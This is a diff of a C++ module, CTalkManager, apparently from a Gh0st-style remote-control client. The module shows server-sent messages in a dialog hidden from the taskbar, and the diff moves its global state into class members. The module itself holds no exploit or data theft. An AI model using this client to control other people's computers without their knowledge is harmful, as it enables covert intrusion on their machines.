@@ -10,7 +10,7 @@
 #include <mmsystem.h>
 
 #pragma comment(lib, "WINMM.LIB")
-using namespace std;
+
 #define ID_TIMER_POP_WINDOW		1
 #define ID_TIMER_DELAY_DISPLAY	2 
 #define ID_TIMER_CLOSE_WINDOW	3 
@@ -20,18 +20,14 @@ using namespace std;
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
-char     g_Buffer[TALK_DLG_MAXLEN] = {0};
-UINT_PTR g_Event  = 0;
-
-IOCPClient* g_IOCPClientObject = NULL;
-
-extern HINSTANCE 	g_hInstance;
 
 CTalkManager::CTalkManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
-	BYTE	bToken = TOKEN_TALK_START;      //包含头文件 Common.h     
+	m_hInstance = HINSTANCE(user);
+	g_Event = 0;
+	memset(g_Buffer, 0, sizeof(g_Buffer));
+	BYTE	bToken = TOKEN_TALK_START;   
 	m_ClientObject->OnServerSending((char*)&bToken, 1);
-	g_IOCPClientObject = ClientObject;
 	WaitForDialogOpen();
 	Mprintf("Talk 构造\n");
 }
@@ -55,8 +51,8 @@ VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			memcpy(g_Buffer, szBuffer, min(ulLength, sizeof(g_Buffer)));
 			//创建一个DLG
-			DialogBox(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
-				NULL,DialogProc);  //SDK   C   MFC  C++
+			DialogBoxParamA(m_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
+				NULL, DialogProc, (LPARAM)this);  //SDK   C   MFC  C++
 			break;
 		}
 	}
@@ -65,11 +61,12 @@ VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 INT_PTR CALLBACK CTalkManager::DialogProc(HWND hDlg, UINT uMsg,
 									  WPARAM wParam, LPARAM lParam)
 {
+	static CTalkManager* This = nullptr;
 	switch(uMsg)
 	{
 	case WM_TIMER:
 		{
-			OnDlgTimer(hDlg);
+			if (This) This->OnDlgTimer(hDlg);
 			break;
 		}
 	case WM_INITDIALOG:
@@ -80,19 +77,19 @@ INT_PTR CALLBACK CTalkManager::DialogProc(HWND hDlg, UINT uMsg,
 			exStyle &= ~WS_EX_APPWINDOW;
 			exStyle |= WS_EX_TOOLWINDOW;
 			SetWindowLongPtr(hDlg, GWL_EXSTYLE, exStyle);
-
-			OnInitDialog(hDlg);   
+			This = (CTalkManager*)lParam;
+			if(This) This->OnInitDialog(hDlg);
 			break;
 		}
 	case WM_COMMAND: 
 		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
 		{ 
 			KillTimer(hDlg, ID_TIMER_CLOSE_WINDOW);
-			BYTE bToken = TOKEN_TALKCMPLT;   
-			g_IOCPClientObject->OnServerSending((char*)&bToken, 1);
+			BYTE bToken = TOKEN_TALKCMPLT;
+			if (This) This->m_ClientObject->OnServerSending((char*)&bToken, 1);
 			EndDialog(hDlg, LOWORD(wParam)); 
 			return (INT_PTR)TRUE; 
-		} 
+		}
 		break;
 	}
 
@@ -114,10 +111,10 @@ VOID CTalkManager::OnInitDialog(HWND hDlg)
 	memset(g_Buffer,0,sizeof(g_Buffer));
 
 	g_Event = ID_TIMER_POP_WINDOW;
-	SetTimer(hDlg, g_Event, 1, NULL);  //时钟回调   
+	SetTimer(hDlg, g_Event, 1, NULL);
 
 	PlaySound(MAKEINTRESOURCE(IDR_WAVE),
-		g_hInstance,SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
+		m_hInstance,SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
 }
 
 
@@ -143,7 +140,7 @@ VOID CTalkManager::OnDlgTimer(HWND hDlg)   //时钟回调
 			{
 				KillTimer(hDlg,ID_TIMER_CLOSE_WINDOW);
 				BYTE bToken = TOKEN_TALKCMPLT;				// 包含头文件 Common.h     
-				g_IOCPClientObject->OnServerSending((char*)&bToken, 1); // 发送允许重新发送的指令
+				m_ClientObject->OnServerSending((char*)&bToken, 1); // 发送允许重新发送的指令
 				EndDialog(hDlg,0);
 			}
 			break;
